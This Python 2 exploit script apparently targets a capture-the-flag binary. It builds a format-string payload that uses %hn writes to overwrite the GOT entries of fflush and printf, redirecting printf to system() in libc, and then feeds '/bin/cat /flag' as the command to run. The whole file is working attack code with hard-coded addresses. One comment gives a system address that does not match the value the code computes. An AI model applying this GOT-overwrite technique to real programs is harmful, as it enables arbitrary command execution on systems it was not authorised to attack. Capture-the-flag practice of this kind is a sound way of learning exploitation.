#!/usr/bin/env python
import struct

printf_addr = 0x0804a00c
fflush_addr = 0x0804a010

libc_base   = 0xf7dfc000
system_addr = libc_base + 0x3a940

# Step 1: overwrite fflush to jump back to 0x08048556
#         fgets(format_string, 99, stdin);

p = 'A'
p += struct.pack('I', fflush_addr)
p += struct.pack('I', fflush_addr + 2)
p += '%29999c%4126c'
p += '%5$hn'
p += '%28899c%4555c'
p += '%6$hn'
p += '\n'

# Step 2: overwrite printf to point to system, 0xf7e367f0

p += 'B'
p += struct.pack('I', printf_addr)
p += struct.pack('I', printf_addr + 2)
p += '%26598c%c'
p += '%10$hn'
p += '%29999c%6852c'
p += '%11$hn'
p += '\n'

# Step 3: provide argument for system()

p += '/bin/cat /flag'

print repr(p)
with open('sploit.bin', 'w') as f:
        f.write(p)